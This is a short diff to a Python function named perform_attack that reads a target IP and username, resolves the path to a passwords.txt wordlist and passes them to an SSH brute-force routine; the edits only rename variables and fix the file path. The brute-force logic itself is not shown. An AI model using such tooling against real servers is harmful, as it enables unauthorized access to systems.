@@ -41,9 +41,9 @@ def perform_attack():
 
     verify_user = "username"
     if verify_user in target_user and target_user[verify_user] == "":
-        target_username = input("No username found. Please enter target username: \n")
-        target_user[verify_user] = target_username
-        print(target_username)
+        target_userName = input("No username found. Please enter target username: \n")
+        target_user[verify_user] = target_userName
+        print(target_userName)
         print("username file has been updated")
     
     # updating file
@@ -55,10 +55,14 @@ def perform_attack():
     with open(targetUser, "w") as username_key:
         json.dump(target_user, username_key, indent=4)
         print(target_user["username"])
+        
+    # file directory
+    base_dir = os.path.dirname(__file__)  # directory of app/__init__.py
+    password_File = os.path.join(base_dir, 'passwords.txt')
     
     TARGETIP = target_ip["target_ip"]
     TARGETUSER = target_user["username"]
-    password_document = "passwords.txt"
+    password_document = password_File
     
     ssh_script.ssh_brute_force(TARGETIP, TARGETUSER, password_document)
     
